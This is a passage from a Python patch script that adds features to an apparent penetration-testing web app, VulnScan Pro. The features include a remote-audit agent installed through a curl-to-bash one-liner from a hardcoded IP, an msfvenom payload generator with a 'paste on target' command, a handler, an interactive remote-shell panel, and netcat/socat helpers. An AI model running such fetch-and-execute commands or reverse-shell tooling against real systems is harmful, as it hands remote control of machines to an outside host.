        +'<button class="btn btn-outline btn-sm" onclick="(function(){try{navigator.clipboard.writeText(\''+kv[1].replace(/'/g,"\\'")+'\')}catch(e){}})()">COPY</button>'
        +'</div></div>';
    });
    html+='</div>';
    box.innerHTML=html;
  }catch(e){showToast('Error',e.message,'error');}
}

/* ═══ Init hooks ═════════════════════════════════════════ */
// Hook into page navigation to load remote audit agents
var _origPg=pg;
pg=function(id,el){
  _origPg(id,el);
  if(id==='remoteaudit'){
    loadRemoteAuditAgents();
    loadRaJobs();
  }
  if(id==='msfvenom'){
    msfAutoLoadPublicIP();
  }
};

// Add payload change listener when msfvenom page loads
document.addEventListener('DOMContentLoaded',function(){
  var pSel=document.getElementById('msfvenom-payload');
  if(pSel){pSel.addEventListener('change',msfPayloadChanged);}
  var pCustom=document.getElementById('msfvenom-custom-payload');
  if(pCustom){pCustom.addEventListener('change',msfPayloadChanged);}
  msfAutoLoadPublicIP();
});
"""

# ════════════════════════════════════════════════════════════
# HTML patches — inject new pages and UI elements
# ════════════════════════════════════════════════════════════

# 1. Add Remote Audit page to nav
REMOTE_AUDIT_NAV_OLD = '''      <div class="nav-section" id="admin-nav-section" style="display:none">
        <button class="nav-item" id="ni-admin" onclick="pg(\'admin\',this)"><span class="ni">&#9881;</span> Admin Console</button>
      </div>'''

REMOTE_AUDIT_NAV_NEW = '''      <div class="nav-section" id="admin-nav-section" style="display:none">
        <button class="nav-item" id="ni-admin" onclick="pg(\'admin\',this)"><span class="ni">&#9881;</span> Admin Console</button>
      </div>
      <div class="nav-section">
        <button class="nav-item" id="ni-remoteaudit" onclick="pg(\'remoteaudit\',this)"><span class="ni">&#127760;</span> Remote Audit</button>
      </div>'''

# 2. Remote Audit page HTML
REMOTE_AUDIT_PAGE_OLD = '''      <!-- HISTORY -->
      <div class="page" id="page-hist">'''

REMOTE_AUDIT_PAGE_NEW = '''      <!-- REMOTE AUDIT — Universal Agent -->
      <div class="page" id="page-remoteaudit">
        <div class="page-hd">
          <div class="page-title">Remote Audit</div>
          <div class="page-desc">Run any security tool on a connected remote Linux system via the universal agent</div>
        </div>
        <div class="notice">&#9888; Authorized use only. Only audit systems you own or have explicit written permission to assess.</div>
        <!-- Agent Install Command -->
        <div class="card card-p" style="margin-bottom:14px">
          <div class="card-title" style="margin-bottom:10px">1. Install Universal Agent on Target Linux System</div>
          <div class="fg" style="margin-bottom:6px">
            <label>INSTALL COMMAND (one-liner, copy and run on target)</label>
            <div class="scan-bar">
              <input class="inp inp-mono" type="text" readonly value="curl -fsSL http://161.118.189.254/agent/install.sh | bash" id="ra-install-cmd"/>
              <button class="btn btn-outline btn-sm" onclick="(function(){var el=document.getElementById('ra-install-cmd');el.select();try{document.execCommand('copy');}catch(e){}})()">COPY</button>
            </div>
          </div>
          <div style="font-size:11px;color:var(--text3)">&#9432; The universal agent supports: lynis, chkrootkit, rkhunter, nmap, nikto, sqlmap, nuclei, whatweb, dnsrecon, theHarvester, ffuf, medusa, hashcat, john, wpscan, hping3, searchsploit, and more.</div>
        </div>
        <!-- Connected Agents -->
        <div class="card card-p" style="margin-bottom:14px">
          <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:10px">
            <div class="card-title">2. Select Connected Agent System</div>
            <button class="btn btn-outline btn-sm" onclick="loadRemoteAuditAgents()">&#8635; REFRESH</button>
          </div>
          <div id="ra-agents-panel" style="color:var(--text3);font-size:12px">Loading agents...</div>
          <div id="ra-selected-lbl" style="font-size:11px;color:var(--text3);margin-top:8px">No agent selected</div>
        </div>
        <!-- Tool Grid -->
        <div class="card card-p" style="margin-bottom:14px">
          <div class="card-title" style="margin-bottom:10px">3. Choose Tool to Run</div>
          <div id="ra-tool-grid" style="color:var(--text3);font-size:12px">Select an agent to see available tools.</div>
          <div id="ra-tool-lbl" style="font-family:var(--mono);font-size:11px;color:var(--text3);margin-top:8px">No tool selected</div>
        </div>
        <!-- Tool Options -->
        <div class="card card-p" style="margin-bottom:14px">
          <div class="card-title" style="margin-bottom:10px">4. Configure &amp; Run</div>
          <div id="ra-tool-opts" style="color:var(--text3);font-size:12px">Select a tool to see options.</div>
          <div style="margin-top:14px">
            <button class="btn btn-primary" id="ra-run-btn" onclick="raRunTool()">&#9654; RUN ON REMOTE SYSTEM</button>
          </div>
        </div>
        <!-- Job Queue -->
        <div class="card card-p" style="margin-bottom:14px">
          <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:10px">
            <div class="card-title">Job Queue</div>
            <button class="btn btn-outline btn-sm" onclick="loadRaJobs()">&#8635; REFRESH</button>
          </div>
          <div id="ra-jobs-panel" style="color:var(--text3);font-size:12px">No jobs yet.</div>
        </div>
        <!-- Output Panel -->
        <div id="ra-output-panel"></div>
      </div>

      <!-- HISTORY -->
      <div class="page" id="page-hist">'''

# 3. SecLists — add Download Full button
SECLISTS_BTNS_OLD = '''          <div style="display:flex;gap:8px;flex-wrap:wrap">
            <button class="btn btn-primary" id="seclists-btn" onclick="runSeclists()">BROWSE WORDLIST</button>
            <button class="btn btn-outline btn-sm" onclick="seclistsCount()">COUNT ENTRIES</button>
            <button class="btn btn-outline btn-sm" onclick="seclistsCopy()">COPY PATH</button>
          </div>'''

SECLISTS_BTNS_NEW = '''          <div style="display:flex;gap:8px;flex-wrap:wrap">
            <button class="btn btn-primary" id="seclists-btn" onclick="runSeclists()">BROWSE FIRST 50</button>
            <button class="btn btn-outline btn-sm" onclick="seclistsCount()">COUNT ENTRIES</button>
            <button class="btn btn-outline btn-sm" onclick="seclistsCopyPath()">COPY PATH</button>
            <button class="btn btn-outline btn-sm" onclick="seclistsDownloadFull()">&#11015; DOWNLOAD FULL LIST</button>
          </div>
          <div style="font-size:11px;color:var(--text3);margin-top:6px">&#9432; Preview shows first 50 lines. Use DOWNLOAD FULL LIST to get the complete wordlist file.</div>'''

# 4. msfvenom — add run-cmd box, shell panel, handler button
MSFVENOM_BTN_OLD = '''          <button class="btn btn-primary" id="msfvenom-btn" onclick="runMsfvenom()">GENERATE PAYLOAD</button>'''

MSFVENOM_BTN_NEW = '''          <button class="btn btn-primary" id="msfvenom-btn" onclick="runMsfvenom()">GENERATE PAYLOAD</button>
          <button class="btn btn-outline btn-sm" id="msf-start-handler-btn" onclick="msfStartHandler()" style="margin-left:8px">&#9654; START HANDLER / LISTENER</button>
        </div>
        <!-- Auto-generated run command -->
        <div id="msf-run-cmd-box" style="display:none;margin-top:14px" class="card card-p">
          <div class="card-title" style="margin-bottom:8px">&#128279; Generated Commands</div>
          <div class="fg"><label>ONE-LINER — PASTE ON TARGET SYSTEM</label>
            <div style="display:flex;gap:6px"><input class="inp inp-mono" id="msf-run-cmd" type="text" readonly style="font-size:11px"/>
            <button class="btn btn-outline btn-sm" onclick="(function(){try{navigator.clipboard.writeText(document.getElementById('msf-run-cmd').value)}catch(e){}})()">COPY</button></div></div>
          <div class="fg"><label>HANDLER COMMAND — RUN ON SERVER</label>
            <div style="display:flex;gap:6px"><input class="inp inp-mono" id="msf-handler-cmd" type="text" readonly style="font-size:11px"/>
            <button class="btn btn-outline btn-sm" onclick="(function(){try{navigator.clipboard.writeText(document.getElementById('msf-handler-cmd').value)}catch(e){}})()">COPY</button></div></div>
        </div>
        <!-- Interactive Shell Panel -->
        <div id="msf-shell-panel" style="display:none;margin-top:14px" class="card">
          <div class="card-header" style="padding:10px 16px">
            <div style="display:flex;align-items:center;gap:8px">
              <div style="width:10px;height:10px;border-radius:50%;background:var(--green)"></div>
              <span style="font-family:var(--mono);font-size:11px;color:var(--text3)">Handler Active — Waiting for connection...</span>
            </div>
            <button class="btn btn-danger btn-sm" onclick="msfKillSession()">&#9632; KILL</button>
          </div>
          <div id="msf-shell-output" style="background:#0a0a0a;color:#00e5ff;font-family:var(--mono);font-size:12px;padding:14px;min-height:240px;max-height:440px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;border-bottom:1px solid var(--border)">
          </div>
          <div style="display:flex;align-items:center;gap:8px;padding:10px 14px;background:var(--bg2)">
            <span style="font-family:var(--mono);font-size:12px;color:var(--text3);flex-shrink:0">msf&gt;</span>
            <input id="msf-cmd-input" class="inp inp-mono" type="text" placeholder="Type command for remote shell..." style="flex:1;background:transparent;border:none;box-shadow:none;padding:4px 0" onkeydown="msfCmdKey(event)" autocomplete="off" spellcheck="false"/>
            <button class="btn btn-primary btn-sm" onclick="msfSendCmd()">SEND</button>
          </div>
        </div>
        <div style="display:none'''  # trick: rest of the closing divs already there

# 5. Netcat — add counterpart box
NC_RUN_OLD = '''          <button class="btn btn-primary" id="nc-btn" onclick="runNetcat()">RUN NETCAT</button>'''
NC_RUN_NEW = '''          <button class="btn btn-primary" id="nc-btn" onclick="runNetcat()">RUN NETCAT</button>
          <button class="btn btn-outline btn-sm" style="margin-left:8px" onclick="ncShowCounterpart()">&#8644; SHOW COUNTERPART CMD</button>
        </div>
        <div id="nc-counterpart-box"></div>
        <div style="display:none'''

# 6. Socat — add counterpart box
SC_RUN_OLD = '''          <button class="btn btn-primary" id="sc-btn" onclick="runSocat()">RUN SOCAT</button>'''
SC_RUN_NEW = '''          <button class="btn btn-primary" id="sc-btn" onclick="runSocat()">RUN SOCAT</button>
          <button class="btn btn-outline btn-sm" style="margin-left:8px" onclick="socatShowCounterpart()">&#8644; SHOW COUNTERPART CMD</button>
        </div>
        <div id="sc-counterpart-box"></div>
        <div style="display:none'''

# Add Remote Audit to PAGE_TITLES and HOME_TOOL_CATALOG
PAGE_TITLES_OLD = "var PAGE_TITLES={home:'Home',scan:'Network Scanner',"
PAGE_TITLES_NEW = "var PAGE_TITLES={home:'Home',remoteaudit:'Remote Audit',scan:'Network Scanner',"

HOME_CATALOG_OLD = "  {label:'AUDITING',color:'#3db870',tools:[['lynis','Lynis','System audit · hardening · compliance'],['openvas','OpenVAS','Open vulnerability assessment'],['chkrootkit','chkrootkit','Local rootkit detector'],['rkhunter','rkhunter','Rootkit Hunter']]}];"
HOME_CATALOG_NEW = "  {label:'AUDITING',color:'#3db870',tools:[['lynis','Lynis','System audit · hardening · compliance'],['remoteaudit','Remote Audit','Universal agent — run any tool on remote system'],['openvas','OpenVAS','Open vulnerability assessment'],['chkrootkit','chkrootkit','Local rootkit detector'],['rkhunter','rkhunter','Rootkit Hunter']]}];"


# ════════════════════════════════════════════════════════════
# APPLY ALL PATCHES
# ════════════════════════════════════════════════════════════

def main():
    print()
    print(B+C+"╔═══════════════════════════════════════════════════════╗"+X)
    print(B+C+"║   VulnScan Pro — Mega Feature Patch                  ║"+X)
    print(B+C+"║   Remote Audit · Legion · SearchSploit · SecLists    ║"+X)
    print(B+C+"║   msfvenom · Netcat/Socat · Remove Reverse Eng       ║"+X)
    print(B+C+"╚═══════════════════════════════════════════════════════╝"+X)
    print()

    if not os.path.isfile("api_server.py"):
        print(R+B+"  ERROR: Run from VulnScan project root (api_server.py not found)"+X)
        sys.exit(1)

    info(f"Project root: {os.getcwd()}")
    print()

    # ── api_server.py patches ────────────────────────────────────
    hdr("api_server.py — New Routes")
    patch_file("api_server.py",
               "Inject audit-agent, searchsploit, seclists, msfvenom, nc/socat routes",
               INJECT_BEFORE, INJECT_NEW)

    hdr("api_server.py — Legion SMB/SNMP/Hydra alignment")
    patch_file("api_server.py",
               "Legion: proper smbclient, snmpwalk, hydra module handlers",
               LEGION_OLD, LEGION_NEW)

    hdr("api_server.py — HTML: Remove Radare2 nav section")
    patch_file("api_server.py",
               "Remove Radare2 from nav-cat-items",
               RADARE2_NAV_SECTION_OLD, RADARE2_NAV_SECTION_NEW)

    hdr("api_server.py — HTML: Add Remote Audit nav item")
    patch_file("api_server.py",
               "Add Remote Audit nav button",
               REMOTE_AUDIT_NAV_OLD, REMOTE_AUDIT_NAV_NEW)

    hdr("api_server.py — HTML: Remove Radare2 from tool catalog")
    patch_file("api_server.py",
               "Remove Reverse Engineering from HOME_TOOL_CATALOG",
               RADARE2_CATALOG_OLD, RADARE2_CATALOG_NEW)

    hdr("api_server.py — HTML: Add Remote Audit page")
    patch_file("api_server.py",
               "Insert Remote Audit page HTML before History page",
               REMOTE_AUDIT_PAGE_OLD, REMOTE_AUDIT_PAGE_NEW)

    hdr("api_server.py — HTML: Legion pills with labels")
    patch_file("api_server.py",
               "Update Legion module pills with tool labels",
               LEGION_PILLS_OLD, LEGION_PILLS_NEW)

    hdr("api_server.py — HTML: SecLists full download button")
    patch_file("api_server.py",
               "Add Download Full button to SecLists",
               SECLISTS_BTNS_OLD, SECLISTS_BTNS_NEW)

    hdr("api_server.py — HTML: msfvenom shell panel + handler")
    patch_file("api_server.py",
               "Add msfvenom handler button + run-cmd box + shell panel",
               MSFVENOM_BTN_OLD, MSFVENOM_BTN_NEW)

    hdr("api_server.py — HTML: Netcat counterpart command")
    patch_file("api_server.py",
               "Add Netcat counterpart command button",
               NC_RUN_OLD, NC_RUN_NEW)

    hdr("api_server.py — HTML: Socat counterpart command")
    patch_file("api_server.py",
               "Add Socat counterpart command button",
               SC_RUN_OLD, SC_RUN_NEW)

    hdr("api_server.py — HTML: PAGE_TITLES + catalog")
    patch_file("api_server.py",
               "Add remoteaudit to PAGE_TITLES",
               PAGE_TITLES_OLD, PAGE_TITLES_NEW)
    patch_file("api_server.py",
               "Add Remote Audit to home tool catalog",
               HOME_CATALOG_OLD, HOME_CATALOG_NEW)

    hdr("api_server.py — JS: Inject all new JavaScript")
    patch_file("api_server.py",
               "Inject Remote Audit / SearchSploit / SecLists / msfvenom / NC+Socat JS",
               JS_INJECTION_MARKER, JS_INJECTION_NEW)

    # ── Syntax check ──────────────────────────────────────────────
    print()
    hdr("Syntax Check")
    passed, err = syntax_check("api_server.py")
    if passed:
        ok("api_server.py — syntax OK")
    else:
        fail(f"api_server.py — SYNTAX ERROR:\n    {err}")
        warn("Restore backup: cp api_server.py.*.mega.bak api_server.py")

    # ── Summary ───────────────────────────────────────────────────
    print()
    print(B+C+"═══════════════════════════════════════════════════════"+X)
    print(
        f"  Applied : {G}{STATS['applied']}{X}  |  "
        f"Skipped : {D}{STATS['skipped']}{X}  |  "
        f"Failed  : {(R if STATS['failed'] else D)}{STATS['failed']}{X}"
    )
    print()

    if STATS["applied"] > 0 and passed:
        print(f"  {G}Restart server to activate:{X}")
        print(f"    python3 api_server.py")
        print(f"    OR: sudo systemctl restart vulnscan")
        print()
        print(f"  {C}What changed:{X}")
        print(f"    {G}✓{X}  Remote Audit page — universal agent runs any tool on remote system")
        print(f"    {G}✓{X}  Legion — proper smbclient, snmpwalk, hydra integration")
        print(f"    {G}✓{X}  SearchSploit — formatted colorised table with EDB links")
        print(f"    {G}✓{X}  SecLists — Download Full List button (no line limit)")
        print(f"    {G}✓{X}  msfvenom — auto-options by payload, public IP LHOST")
        print(f"    {G}✓{X}  msfvenom — one-liner agent command for target system")
        print(f"    {G}✓{X}  msfvenom — handler listener + interactive shell panel")
        print(f"    {G}✓{X}  Netcat — counterpart command for the other side")
        print(f"    {G}✓{X}  Socat — counterpart command for the other side")
        print(f"    {G}✓{X}  Radare2 / Reverse Engineering section removed")
        print()
        print(f"  {Y}Set public IP via env var (optional):{X}")
        print(f"    export VULNSCAN_PUBLIC_IP=<your.server.ip>")
        print(f"    Then restart: python3 api_server.py")
    elif STATS["failed"] > 0:
        print(f"  {R}Some patches failed. Check anchors in api_server.py.{X}")
        print(f"  Backups: api_server.py.*.mega.bak")

    print()


if __name__ == "__main__":
    main()
